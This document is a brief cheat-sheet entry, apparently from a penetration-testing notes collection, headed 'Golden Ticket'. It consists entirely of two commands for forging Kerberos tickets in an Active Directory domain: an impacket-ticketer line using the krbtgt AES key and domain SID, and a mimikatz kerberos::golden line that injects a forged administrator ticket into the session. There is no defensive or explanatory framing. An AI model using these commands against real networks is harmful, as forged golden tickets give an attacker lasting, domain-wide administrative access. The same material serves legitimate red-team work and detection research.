# Golden Ticket

 - impacket-ticketer -aesKey KRBTGT_AES_KEY -domain-sid DOMAIN_SID -domain DOMAIN ANY_USER

 - mimikatz "kerberos::golden /user:ADMIN_USER /domain:DOMAIN /sid:DOMAIN-SID /aes256:KRBTGT_AES256 /ptt"
